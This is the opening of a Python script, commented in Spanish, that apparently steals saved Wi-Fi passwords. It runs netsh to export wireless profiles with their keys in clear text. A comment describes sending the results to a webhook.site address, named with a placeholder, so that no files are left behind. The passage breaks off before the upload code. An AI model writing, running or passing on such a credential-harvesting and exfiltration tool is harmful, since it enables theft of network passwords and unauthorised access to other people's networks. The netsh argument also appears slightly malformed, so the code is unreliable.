import os, sys, requests, subprocess
import xml.etree.ElementTree as t

#guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
urlpost = 'https://webhook.site/TUDIRECCIONUNICA'

#lista de exportaciones xml que genera el netsh
Archivos_XML_WIFI = []

#corre el comando en la command prompt
cmd = subprocess.run(["netsh", "wlan", "export", "profiles", "type=clear"], capture_output=True).stdout.decode()
#guarda la ruta actual
ruta = os.getcwd()

